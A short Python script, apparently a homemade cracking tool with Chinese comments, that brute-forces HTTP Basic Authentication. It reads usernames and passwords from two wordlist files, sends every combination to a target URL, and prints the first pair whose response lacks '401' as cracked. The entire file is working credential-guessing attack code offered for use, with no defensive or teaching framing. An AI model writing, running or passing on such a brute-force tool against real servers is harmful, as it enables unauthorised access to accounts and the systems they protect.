# -*- encoding: utf-8 -*-
#by fish
import requests
import sys 
import re
from requests.auth import AuthBase
from requests.auth import HTTPBasicAuth

#python3 httpBasicAuth.py http://xxxx user.txt password.txt
#1.读取用户名 和密码 


def usage():
    print("python3 httpBasicAuth.py http://xxxx user.txt password.txt")

def HTTPBasicAuthCrake(url,user,password):
    auth = HTTPBasicAuth(user,password)
    print(user,':',password,'')
    r = requests.post(url = url,auth=auth )
    #正则 401匹配返回值
    betRegex = re.compile(r'401')
    mol = betRegex.search(r.text)
    #print (mol)
    if mol == None:
        print('[+] creak!' + 'user' + user + ':' + 'password:' + password)
        return True
    return False

if __name__ == "__main__":
    usage()
    users = []
    passs = []
    global flag 
    flag = False
    url = sys.argv[1]
    with open(sys.argv[2],'r') as f:
        while True:
            line = f.readline()
            if not line:
                break
            line = line.strip('\n')
            users.append(line)
    with open(sys.argv[3],'r') as f:
        while True:
            line = f.readline()
            if not line:
                break
            line =  line.strip('\n')
            passs.append(line)
    #print (users)
    #print (passs)             
    #开始破解
    for user in users:
        for password in passs:
                if flag != True:
                    #print (flag)
                    flag = HTTPBasicAuthCrake(url,user,password)